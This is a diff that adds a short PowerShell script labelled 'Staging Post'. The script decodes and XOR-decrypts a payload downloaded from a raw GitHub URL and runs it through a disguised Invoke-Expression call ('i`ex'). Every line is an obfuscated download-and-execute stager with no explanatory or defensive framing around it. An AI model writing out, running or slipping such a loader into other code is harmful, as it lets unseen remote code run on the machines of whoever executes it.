@@ -1,0 +1,16 @@
+# ====================== Staging Post =============================
+
+ function dojob {
+    param ([string]$sec,[string]$bty)
+    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
+    $asg = ""
+    for ($i = 0; $i -lt $ajd.Length; $i++) {
+        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
+        $asg += [char]$osn
+    }
+    return $asg
+}
+
+$t = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
+$isn = dojob -sec $t -bty $k
+$isn | i`ex
